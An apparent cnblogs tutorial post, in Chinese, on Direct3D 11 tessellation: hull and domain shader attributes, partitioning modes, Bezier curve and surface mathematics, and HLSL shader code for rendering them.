&lt;p&gt;通过&lt;code&gt;InputPatch&lt;/code&gt;参数可以将面片的所有控制点都传至外壳着色器中。系统值&lt;code&gt;SV_OutputControlPointID&lt;/code&gt;索引的是正在被外壳着色器处理的输出控制点。值得注意的是，输入的控制点数量与输出的控制点数量&lt;strong&gt;未必&lt;/strong&gt;相同。例如，输入的面片可能仅含有4个控制点，而输出的面片却能够拥有16个控制点；这些多出来的控制点可以由输入的4个控制点所衍生。&lt;/p&gt;
&lt;p&gt;上面的控制点外壳着色器还用到了以下几种属性。&lt;/p&gt;
&lt;ol readability=&quot;5.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;code&gt;domain&lt;/code&gt;：面片的类型。可选用的参数有&lt;code&gt;tri&lt;/code&gt;（三角形面片）、&lt;code&gt;quad&lt;/code&gt;（四边形面片）或&lt;code&gt;isoline&lt;/code&gt;（等值线）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;partioning&lt;/code&gt;：指定了曲面细分的细分模式。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;integer&lt;/code&gt;：新顶点的添加或移除依据的是&lt;strong&gt;上取整的函数&lt;/strong&gt;。例如我们将细分值设为3.25f时，实际上它将会细分为4份。这样一来，在网格随着曲面细分级别而改变时，会容易发生明显的跃变。&lt;/li&gt;
&lt;li&gt;非整型曲面细分（&lt;code&gt;fractional_even&lt;/code&gt;/&lt;code&gt;fractional_odd&lt;/code&gt;）：新顶点的增加或移除取决于曲面细分因子的整数部分，但是细微的渐变“过渡”调整就要根据细分因子的小数部分。当我们希望将粗糙的网格经曲面细分而平滑地过渡到具有更加细节的网格时，该参数就派上用场了。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pow2&lt;/code&gt;：目前测试的时候行为和&lt;code&gt;integer&lt;/code&gt;一致，不知道什么原因。这里暂时不讲述。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;outputtopology&lt;/code&gt;：通过细分所创的三角形的绕序&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;triangle_cw&lt;/code&gt;：顺时针方向的绕序&lt;/li&gt;
&lt;li&gt;&lt;code&gt;triangle_ccw&lt;/code&gt;：逆时针方向的绕序&lt;/li&gt;
&lt;li&gt;&lt;code&gt;line&lt;/code&gt;：针对线段的曲面细分&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;code&gt;outputcontrolpoints&lt;/code&gt;：外壳着色器执行的次数，每次执行都输出1个控制点。系统值&lt;code&gt;SV_OutputControlPointID&lt;/code&gt;给出的索引标明了当前正在工作的外壳着色器所输出的控制点。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;patchconstantfunc&lt;/code&gt;：指定常量外壳着色器函数名称的字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;code&gt;maxtessfactor&lt;/code&gt;：告知驱动程序，用户在着色器中所用的曲面细分因子的最大值。如果硬件知道了此上限，就可以了解曲面细分所需的资源，继而在后台对此进行优化。Direct3D 11硬件支持的曲面细分因子最大值为64&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;程序员无法对镶嵌器这一阶段进行任何控制，因为这一步的操作全权交给硬件处理。此环节会基于常量外壳着色器程序所输出的曲面细分因子，对面片进行镶嵌化处理。&lt;/p&gt;
&lt;h2 id=&quot;四边形面片的曲面细分示例&quot;&gt;四边形面片的曲面细分示例&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;&lt;code&gt;integer&lt;/code&gt;模式&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011412791-1802985608.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011417784-367557249.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;&lt;code&gt;fractional_odd&lt;/code&gt;模式：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011422477-1870169641.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011428479-1998676442.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;&lt;code&gt;fractional_even&lt;/code&gt;模式：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011522040-2032118176.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011527950-125350788.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;三角形面片的曲面细分示例&quot;&gt;三角形面片的曲面细分示例&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011532298-1700955289.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011536891-457748322.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;镶嵌器阶段会输出新建的所有顶点与三角形，在此阶段所创建的顶点，都会逐一调用域着色器进行后续处理。随着曲面细分功能的开启，顶点着色器便化身为“处理每个控制点的顶点着色器”，而外壳着色器的本质则为“针对已经镶嵌化的面片进行处理的顶点着色器”。特别是，我们可以在此将经过镶嵌化处理的面片顶点投射到齐次裁剪空间。&lt;/p&gt;
&lt;p&gt;首先是三角形面片，域着色器以曲面细分因子（还有一些来自常量外壳着色器所输出的每个面片的附加信息）、控制点外壳着色器所输出的所有面片控制点、镶嵌化处理后的顶点位置参数（以重心坐标系&lt;code&gt;(alpha, beta, gamma)&lt;/code&gt;的形式表示）作为输入。注意，域着色器给出的并不是镶嵌化处理后的实际顶点位置，而是这些点位于面片域空间内的参数坐标。是否利用这些参数坐标及控制点来求取真正的3D顶点位置，完全取决于用户自己。下面展示了前面的例子显示的三角形所用到的域着色器代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;struct VertexOut
{
    float3 PosL : POSITION;
};

typedef VertexOut HullOut;

// Tessellation_Triangle_DS.hlsl

[domain(&quot;tri&quot;)]
float4 DS(TriPatchTess patchTess,
    float3 weights : SV_DomainLocation,
    const OutputPatch&amp;lt;HullOut, 3&amp;gt; tri) : SV_POSITION
{
    // 重心坐标系插值
    float3 pos = tri[0].PosL * weights[0] +
        tri[1].PosL * weights[1] +
        tri[2].PosL * weights[2];
    
    return float4(pos, 1.0f);
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将三角形面片以重心坐标系作为输出的原因，很可能是因为贝塞尔三角形面片都是用重心坐标来定义所导致的。&lt;/p&gt;
&lt;p&gt;而四边形面片的顶点位置参数以&lt;code&gt;(u, v)&lt;/code&gt;的形式表示，前面例子的四边形所用的域着色器代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;struct VertexOut
{
    float3 PosL : POSITION;
};

typedef VertexOut HullOut;

// Tessellation_Quad_DS.hlsl

[domain(&quot;quad&quot;)]
float4 DS(QuadPatchTess patchTess,
    float2 uv : SV_DomainLocation,
    const OutputPatch&amp;lt;HullOut, 4&amp;gt; quad) : SV_POSITION
{
    // 双线性插值
    float3 v1 = lerp(quad[0].PosL, quad[1].PosL, uv.x);
    float3 v2 = lerp(quad[2].PosL, quad[3].PosL, uv.x);
    float3 p = lerp(v1, v2, uv.y);
    
    return float4(p, 1.0f);
}

&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;这部分借用GAMES101来说明。并且这里讲的贝塞尔曲线所用的算法是由Pierre Bézier和Paul de Casteljau所提出的。&lt;/p&gt;
&lt;p&gt;现在我们先从二阶贝塞尔曲线开始，下面有3个非共线的控制点&lt;strong&gt;b0&lt;/strong&gt;、&lt;strong&gt;b1&lt;/strong&gt;和&lt;strong&gt;b2&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011604866-1942744237.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来我们用线性插值的方式，从&lt;strong&gt;b0&lt;/strong&gt;到&lt;strong&gt;b1&lt;/strong&gt;方向的线段使用参数&lt;strong&gt;t&lt;/strong&gt;来确定其中一点，记为&lt;span class=&quot;math inline&quot;&gt;\(\mathbf{b_{0}^{1}}\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011611003-1959023709.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后从&lt;strong&gt;b1&lt;/strong&gt;到&lt;strong&gt;b2&lt;/strong&gt;方向的线段使用同样的参数&lt;strong&gt;t&lt;/strong&gt;来确定另一点，记为&lt;span class=&quot;math inline&quot;&gt;\(\mathbf{b_{1}^{1}}\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011619191-506257328.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将&lt;span class=&quot;math inline&quot;&gt;\(b_{0}^{1}\)&lt;/span&gt;和&lt;span class=&quot;math inline&quot;&gt;\(b_{1}^{1}\)&lt;/span&gt;连接起来，问题降级为一阶贝塞尔曲线（直线）。我们对其再使用一次参数&lt;strong&gt;t&lt;/strong&gt;的线性插值即可得到在参数&lt;strong&gt;t&lt;/strong&gt;下该贝塞尔曲线的对应一点&lt;span class=&quot;math inline&quot;&gt;\(\mathbf{b_{2}^{0}}\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011627772-73399118.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们将&lt;strong&gt;t&lt;/strong&gt;在&lt;code&gt;[0, 1]&lt;/code&gt;的所有情况都求出来，就可以得到一条光滑的贝塞尔曲线。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011632527-1999434860.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;三阶的贝塞尔曲线需要用到4个控制点，但做法也是类似的。首先求出&lt;strong&gt;b0&lt;/strong&gt;到&lt;strong&gt;b1&lt;/strong&gt;，&lt;strong&gt;b1&lt;/strong&gt;到&lt;strong&gt;b2&lt;/strong&gt;，&lt;strong&gt;b2到b3&lt;/strong&gt;的线段在t时刻下的插值点&lt;span class=&quot;math inline&quot;&gt;\(\mathbf{b_{0}^{1}}, \mathbf{b_{1}^{1}}, \mathbf{b_{2}^{1}}\)&lt;/span&gt;，此时问题就被转化成了这三个控制点下的二阶贝塞尔曲线。不断降阶最终算出目标点即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011642645-361239425.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，三阶贝塞尔曲线需要进行6次插值运算，二阶贝塞尔曲线则需要进行3次插值运算。以此类推，我们可以知道n阶贝塞尔曲线需要n(n+1)/2次运算&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011648574-3489908.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;计算过程&quot;&gt;计算过程&lt;/h2&gt;
&lt;p&gt;下图阐述了二阶贝塞尔曲线的计算过程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011655019-637396702.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;观察&lt;strong&gt;b0&lt;/strong&gt;、&lt;strong&gt;b1&lt;/strong&gt;和&lt;strong&gt;b2&lt;/strong&gt;的各项系数，可以发现它们满足二项式定理。我们也可以用下面的一个金字塔来描述&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011701665-1316514395.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从底端的这些控制点选取其中一个然后不断往上走，最终走到顶端点的过程中，如果走过一段朝着右上方向的路径，则给该控制点乘上因子&lt;strong&gt;(1-t)&lt;/strong&gt;，而朝着左上方向的路径则给该控制点乘上因子&lt;strong&gt;t&lt;/strong&gt;。比如从&lt;strong&gt;b0&lt;/strong&gt;走到顶端的项为&lt;span class=&quot;math inline&quot;&gt;\(t^3 b_{0}\)&lt;/span&gt;。我们将这所有8条路径都加起来就可以得到最后的结果：&lt;/p&gt;
&lt;p&gt;\[\mathbf{b_0^3} = (1-t)^3\mathbf{b_0} + 3t(1-t)^2\mathbf{b_1} + 3t^2 (1-t)\mathbf{b_2} + t^3\mathbf{b_3} \]&lt;/p&gt;
&lt;p&gt;更抽象的，我们可以用&lt;strong&gt;伯恩斯坦函数&lt;/strong&gt;的形式来表示：&lt;/p&gt;
&lt;p&gt;\[\mathbf{b^n}(t)=\sum_{i=0}^{n} C_{n}^{i}t^{i}(1-t)^{n-i}\cdot\mathbf{b_i} \]&lt;/p&gt;
&lt;p&gt;对于三阶贝塞尔曲线而言，曲线端点为：&lt;/p&gt;
&lt;p&gt;\[\mathbf{b^3}(0)=\mathbf{b_0};\;\;\mathbf{b^3}(1)=\mathbf{b_3} \]&lt;/p&gt;
&lt;p&gt;而三次伯恩斯坦函数的导数为：&lt;/p&gt;
&lt;p&gt;\[\begin{align} {B_{0}^{3}}'(t)&amp;amp;=-3(1-t)^2\\ {B_{1}^{3}}'(t)&amp;amp;=3(1-t)^2-6t(1-t)\\ {B_{2}^{3}}'(t)&amp;amp;=6t(1-t)-3t^2\\ {B_{3}^{3}}'(t)&amp;amp;=3t^2\\ \end{align} \]&lt;/p&gt;
&lt;p&gt;因此，对3次贝塞尔曲线求导的结果为：&lt;/p&gt;
&lt;p&gt;\[\mathbf{{b^3}'(t)}=-3(1-t)^2\mathbf{b_0}+[3(1-t)^2-6t(1-t)]\mathbf{b_1}+[6t(1-t)-3t^2]\mathbf{b_2}+3t^2\mathbf{b_3} \]&lt;/p&gt;
&lt;p&gt;通过这些导数就可以很方便地计算出曲线上某点处的切向量。&lt;/p&gt;
&lt;h2 id=&quot;连续性&quot;&gt;连续性&lt;/h2&gt;
&lt;p&gt;对于复杂曲线，如果我们使用高阶曲线的话，观察伯恩斯坦函数形式的顶点式会发现计算量呈平方级别增长。为此我们可以考虑将该曲线分段，然后这些曲线都使用较低阶的贝塞尔曲线去拟合，以此来减少计算量。&lt;/p&gt;
&lt;p&gt;假设我们现在有两条三阶贝塞尔曲线&lt;strong&gt;a&lt;/strong&gt;和&lt;strong&gt;b&lt;/strong&gt;，那么当曲线&lt;strong&gt;a&lt;/strong&gt;的最后一个控制点与曲线&lt;strong&gt;b&lt;/strong&gt;的第一个控制点位置相同时，我们称这两条曲线满足&lt;strong&gt;C0&lt;/strong&gt;连续。下图的红点为控制点，观察中间的控制点处显然满足这一性质，但是可以看到左右两端曲线的过渡并不是平缓的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011714813-1110207976.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;而如果在满足&lt;strong&gt;C0&lt;/strong&gt;连续的基础上，曲线&lt;strong&gt;a&lt;/strong&gt;在最后一个控制点处的导数还与曲线&lt;strong&gt;b&lt;/strong&gt;在第一个控制点处的导数相等，则此时我们说这两条曲线满足&lt;strong&gt;C1&lt;/strong&gt;连续。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011719097-1648738278.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;而满足&lt;strong&gt;C1&lt;/strong&gt;连续的控制点必然满足：&lt;/p&gt;
&lt;p&gt;\[\mathbf{a_n}=\mathbf{b_0}=\frac{1}{2}(\mathbf{a_{n-1}+b_{1}}) \]&lt;/p&gt;
&lt;p&gt;即曲线&lt;strong&gt;a&lt;/strong&gt;和&lt;strong&gt;b&lt;/strong&gt;的连接点为曲线&lt;strong&gt;a&lt;/strong&gt;倒数第二个控制点与曲线&lt;strong&gt;b&lt;/strong&gt;第二个控制点的中点。&lt;/p&gt;
&lt;p&gt;当然还有更高级别的&lt;strong&gt;C2&lt;/strong&gt;连续，即满足二阶导数相等，这里不再深入讨论。&lt;/p&gt;
&lt;h2 id=&quot;hlsl代码实现&quot;&gt;HLSL代码实现&lt;/h2&gt;
&lt;p&gt;绘制贝塞尔曲线的外壳着色器和域着色器代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;// Tessellation.hlsli

float4 BernsteinBasis(float t)
{
    float invT = 1.0f - t;
    
    return float4(
        invT * invT * invT,         // B_{0}^{3}(t)= (1-t)^3
        3.0f * t * invT * invT,     // B_{1}^{3}(t)= 3t(1-t)^2
        3.0f * t * t * invT,        // B_{2}^{3}(t)= 3t^2(1-t)
        t * t * t);                 // B_{3}^{3}(t)= t^3
}

float4 dBernsteinBasis(float t)
{
    float invT = 1.0f - t;
    
    return float4(
        -3 * invT * invT,                   // B_{0}^{3}'(t)= -3(1-t)^2
        3.0f * invT * invT - 6 * t * invT,  // B_{1}^{3}'(t)= 3(1-t)^2 - 6t(1-t)
        6 * t * invT - 3 * t * t,           // B_{2}^{3}'(t)= 6t(1-t) - 3t^2
        3 * t * t);                         // B_{3}^{3}'(t)= 3t^2
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;// Tessellation_Isoline_HS.hlsl
IsolinePatchTess IsolineConstantHS(InputPatch&amp;lt;VertexOut, 4&amp;gt; patch, uint patchID : SV_PrimitiveID)
{
    IsolinePatchTess pt;
    
    pt.EdgeTess[0] = g_IsolineEdgeTess[0];  // 未知
    pt.EdgeTess[1] = g_IsolineEdgeTess[1];  // 段数
    
    return pt;
}

[domain(&quot;isoline&quot;)]
[partitioning(&quot;integer&quot;)]
[outputtopology(&quot;line&quot;)]
[outputcontrolpoints(4)]
[patchconstantfunc(&quot;IsolineConstantHS&quot;)]
[maxtessfactor(64.0f)]
float3 HS(InputPatch&amp;lt;VertexOut, 4&amp;gt; patch, uint i : SV_OutputControlPointID, uint patchId : SV_PrimitiveID) : POSITION
{
    return patch[i].PosL;
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;// Tessellation_BezierCurve_DS.hlsl
#include &quot;Tessellation.hlsli&quot;

[domain(&quot;isoline&quot;)]
float4 DS(IsolinePatchTess patchTess,
    float t : SV_DomainLocation,
    const OutputPatch&amp;lt;HullOut, 4&amp;gt; bezPatch) : SV_POSITION
{
    float4 basisU = BernsteinBasis(t);
    
    // 贝塞尔曲线插值
    float3 sum = basisU.x * bezPatch[0].PosL +
        basisU.y * bezPatch[1].PosL +
        basisU.z * bezPatch[2].PosL +
        basisU.w * bezPatch[3].PosL;
    
    float4 posH = mul(float4(sum, 1.0f), g_WorldViewProj);
    
    return posH;
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;贝塞尔曲线示例&quot;&gt;贝塞尔曲线示例&lt;/h2&gt;
&lt;p&gt;下面的动图展示了贝塞尔曲线的控制和细分&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011730668-1051746617.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;三阶贝塞尔曲线有4个控制点，而三阶贝塞尔曲面自然就有4x4控制点了。我们可以将其看做4条三次贝塞尔曲线。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011737721-680416729.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里就不再列出复杂的公式来晕人了。在一维情况下，贝塞尔曲线使用范围在&lt;code&gt;[0, 1]&lt;/code&gt;的参数&lt;strong&gt;t&lt;/strong&gt;来表示曲线上一点。那么在二维情况下，我们可以使用范围在&lt;code&gt;[0, 1]&lt;/code&gt;的参数&lt;strong&gt;(u, v)&lt;/strong&gt;来表示曲面上一点。&lt;/p&gt;
&lt;p&gt;首先对于这4条横向的贝塞尔曲线，我们分别使用参数u代入来求得四个点，这四个顶点按列顺序构成新的控制点，然后问题就转化成了在这四个控制点构成的贝塞尔曲线中求其中一点。然后我们再用参数v代入就可以求得最终在曲面上的一点。&lt;/p&gt;
&lt;h2 id=&quot;hlsl代码实现-2&quot;&gt;HLSL代码实现&lt;/h2&gt;
&lt;p&gt;贝塞尔曲面的着色器代码实现如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;// Tessellation.hlsli

// 计算以4x4控制点为基础的三阶贝塞尔曲面在(u, v)下的一点
float3 CubicBezierSum(const OutputPatch&amp;lt;HullOut, 16&amp;gt; bezPatch,
    float4 basisU, float4 basisV)
{
    float3 sum = float3(0.0f, 0.0f, 0.0f);
    sum = basisV.x * (basisU.x * bezPatch[0].PosL +
        basisU.y * bezPatch[1].PosL +
        basisU.z * bezPatch[2].PosL +
        basisU.w * bezPatch[3].PosL);
    
    sum += basisV.y * (basisU.x * bezPatch[4].PosL +
        basisU.y * bezPatch[5].PosL +
        basisU.z * bezPatch[6].PosL +
        basisU.w * bezPatch[7].PosL);
    
    sum += basisV.z * (basisU.x * bezPatch[8].PosL +
        basisU.y * bezPatch[9].PosL +
        basisU.z * bezPatch[10].PosL +
        basisU.w * bezPatch[11].PosL);
    
    sum += basisV.w * (basisU.x * bezPatch[12].PosL +
        basisU.y * bezPatch[13].PosL +
        basisU.z * bezPatch[14].PosL +
        basisU.w * bezPatch[15].PosL);
    
    return sum;
}


&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的函数不仅能用来计算&lt;span class=&quot;math inline&quot;&gt;\(\mathbf{p}(u, v)\)&lt;/span&gt;，还能够求它的偏导数：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;float4 basisU = BernsteinBasis(uv.x);
float4 basisV = BernsteinBasis(uv.y);
    
// p(u, v)
float3 p = CubicBezierSum(bezPatch, basisU, basisV);


float4 dBasisU = dBernsteinBasis(uv.x);
float4 dBasisV = dBernsteinBasis(uv.y);
// p(u, v)对u的偏导
float3 dpdu = CubicBezierSum(bezPatch, dbasisU, basisV);
// p(u, v)对v的偏导
float3 dpdv = CubicBezierSum(bezPatch, basisU, dbasisV);
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;注意：可以发现，我们把基函数的计算结果传入了&lt;code&gt;CubicBezierSum&lt;/code&gt;函数。由于&lt;code&gt;p(u, v)&lt;/code&gt;与其偏导数的求和形式相同，仅基函数不同，因此&lt;code&gt;CubicBezierSum&lt;/code&gt;函数不仅能用来计算&lt;code&gt;p(u, v)&lt;/code&gt;，还能用于求其偏导数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;// Tessellation_BezierSurface_HS.hlsl
#include &quot;Tessellation.hlsli&quot;

[domain(&quot;quad&quot;)]
[partitioning(&quot;integer&quot;)]
[outputtopology(&quot;triangle_cw&quot;)]
[outputcontrolpoints(16)]
[patchconstantfunc(&quot;QuadPatchConstantHS&quot;)]
[maxtessfactor(64.0f)]
float3 HS(InputPatch&amp;lt;VertexOut, 16&amp;gt; patch, uint i : SV_OutputControlPointID, uint patchId : SV_PrimitiveID) : POSITION
{
    return patch[i].PosL;
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;// Tessellation_BezierSurface_DS.hlsl
#include &quot;Tessellation.hlsli&quot;

[domain(&quot;quad&quot;)]
float4 DS(QuadPatchTess patchTess,
    float2 uv : SV_DomainLocation,
    const OutputPatch&amp;lt;HullOut, 16&amp;gt; bezPatch) : SV_POSITION
{
    float4 basisU = BernsteinBasis(uv.x);
    float4 basisV = BernsteinBasis(uv.y);
    
    // 贝塞尔曲面插值
    float3 p = CubicBezierSum(bezPatch, basisU, basisV);
    
    float4 posH = mul(float4(p, 1.0f), g_WorldViewProj);
    
    return posH;
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;几何体定义&quot;&gt;几何体定义&lt;/h2&gt;
&lt;p&gt;下面的代码定义了16个控制点：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;XMFLOAT3 surfaceVertices[16] = {
// 行 0
XMFLOAT3(-10.0f, -10.0f, +15.0f),
XMFLOAT3(-5.0f,  0.0f, +15.0f),
XMFLOAT3(+5.0f,  0.0f, +15.0f),
XMFLOAT3(+10.0f, 0.0f, +15.0f),

// 行 1
XMFLOAT3(-15.0f, 0.0f, +5.0f),
XMFLOAT3(-5.0f,  0.0f, +5.0f),
XMFLOAT3(+5.0f,  20.0f, +5.0f),
XMFLOAT3(+15.0f, 0.0f, +5.0f),

// 行 2
XMFLOAT3(-15.0f, 0.0f, -5.0f),
XMFLOAT3(-5.0f,  0.0f, -5.0f),
XMFLOAT3(+5.0f,  0.0f, -5.0f),
XMFLOAT3(+15.0f, 0.0f, -5.0f),

// 行 3
XMFLOAT3(-10.0f, 10.0f, -15.0f),
XMFLOAT3(-5.0f,  0.0f, -15.0f),
XMFLOAT3(+5.0f,  0.0f, -15.0f),
XMFLOAT3(+25.0f, 10.0f, -15.0f)
};
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注意：这里并没有严格地限定控制点一定要按等距排列为均匀的网格。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;贝塞尔曲面示例&quot;&gt;贝塞尔曲面示例&lt;/h2&gt;
&lt;p&gt;下图展示了贝塞尔曲面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011755719-633829500.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;ol&gt;&lt;li&gt;参考16章，只用6个顶点构成的八面体，并根据其与观察点的距离关系将其镶嵌细分为一个球体（距离越近，镶嵌程度越大）&lt;/li&gt;
&lt;li&gt;尝试修改本演示程序中的控制点来改变其中的贝塞尔曲面&lt;/li&gt;
&lt;li&gt;修改本演示程序，利用光照使得其中的贝塞尔曲面表现出明暗变化。为此，我们需要在域着色器中计算顶点法线。而位于顶点处的法线可以用此曲面点处坐标的偏导数的叉积求得。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://www.cnblogs.com/X-Jun/p/9028764.html&quot;&gt;DirectX11 With Windows SDK完整目录&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/MKXJun/DirectX11-With-Windows-SDK&quot;&gt;Github项目源码&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;欢迎加入QQ群: 727623616 可以一起探讨DX11，以及有什么问题也可以在这里汇报。&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 11 Jul 2020 17:20:00 +0000</pubDate>
<dc:creator>X_Jun</dc:creator>
<og:description>前言 曲面细分是Direct3D 11带来的其中一项重要的新功能。它引入了两个可编程着色器阶段以及一个固定的镶嵌处理过程。简单来说，曲面细分技术可以将几何体细分为更小的三角形，并以某种方式把这些新生成</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/X-Jun/p/13286441.html</dc:identifier>
</item>
<item>
<title>九、生产者与消费者模式 - abc十号</title>
<link>http://www.cnblogs.com/xiexiandong/p/13286399.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiexiandong/p/13286399.html</guid>
